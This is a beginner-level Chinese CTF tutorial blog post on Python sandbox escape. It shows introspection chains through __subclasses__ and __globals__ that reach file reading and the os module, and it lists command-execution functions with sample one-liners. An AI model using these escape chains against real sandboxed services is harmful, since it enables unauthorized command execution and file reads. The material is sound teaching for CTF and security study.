---
tags: []
categories:
  - CTF-WEB
date: 2020-02-06 19:45:00
cover: /img/post/11.jpg
---

---
>**说明：本篇文章适合这方面的小白的入门，结合我的另一篇文章[https://blog.csdn.net/zss192/article/details/104199520](https://blog.csdn.net/zss192/article/details/104199520)更容易理解**
## 一些常见的寻找特殊模块的方式
    __class__:获得当前对象的类
    __bases__:列出其基类
    __mro__ :列出解析方法的调用顺序，类似于bases
    __subclasses__()：返回子类列表
    __dict__ ： 列出当前属性/函数的字典
    __init__  : 一般跟在类的后面，相当于实例化这个类
    __globals__ : 以字典的形式返回函数所在的全局命名空间所定义的全局变量
```python
>>> [].__class__
<type 'list'>
```
**python的内置对象有一个class属性来存储类型，我们可以使用base属性往上找他的父类**
```python
>>> [].__class__.__base__
<type 'object'>
```
**得到object对象后之后我们可通过属性subclasses来查看object的所有子类**

```python
>>> [].__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
```
**而在这所有子类中file类可读取文件，我们可以通过index查找file类的位置（file类只在python2存在）**

```python
>>> [].__class__.__base__.__subclasses__().index(file)
40
```
**我们可用下列代码读取目标文件**

```python
[].__class__.__base__.__subclasses__()[40]('./flag.txt').read()
```
**我们可用下列代码引用指定模块（eg:os模块）**

```python
>>> [].__class__.__base__.__subclasses__()[71].__init__.__globals__['os']
<module 'os' from '/usr/lib/python2.7/os.pyc'>
```
**上面的语句相当于os我们便可像往常用os来使用了，比如使用os模块的listdir**

```python
[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir("./")
```
**上面语句等同于使用os.listdir("./")**

## Python中可以利用的方法和模块
###### 1.任意代码或者命令执行
_ import _()函数

```python
__import__("os").system("ls")
```

timeit模块	

```python
import timeit
timeit.timeit("__import__('os').system('ls')",number=1)
```

exec()，eval()，execfile()，compile()函数

```python
eval('__import__("os").system("ls")')
exec("a+1")
compile('a = 1 + 2', '<string>', 'exec')
```

    注意：execfile()只存在于Python2，Python3没有该函数

platform模块

```python
import platform
platform.popen('dir').read()
```

os模块

```python
import os
os.system('ls')
os.popen("ls").read()
```
subprocess模块

```python
import subprocess
subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
```

importlib模块

```python
import importlib
importlib.import_module('os').system('ls')
#Python3可以，Python2没有该函数
importlib.__import__('os').system('ls')
```
#### 2.文件操作
file()函数

```python
file('test.txt').read()
#注意：该函数只存在于Python2，Python3不存在
```
   

open()函数
```python
open('text.txt').read()
```
codecs模块

```python
import codecs
codecs.open('test.txt').read()
```
###### tips:做这类题时有固定的格式，只不过有时需要绕过下，本篇文章只涉及基础讲解不牵扯绕过姿势。
## 参考
[Python沙箱逃逸总结](https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/)
[python sandbox escape](https://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/)





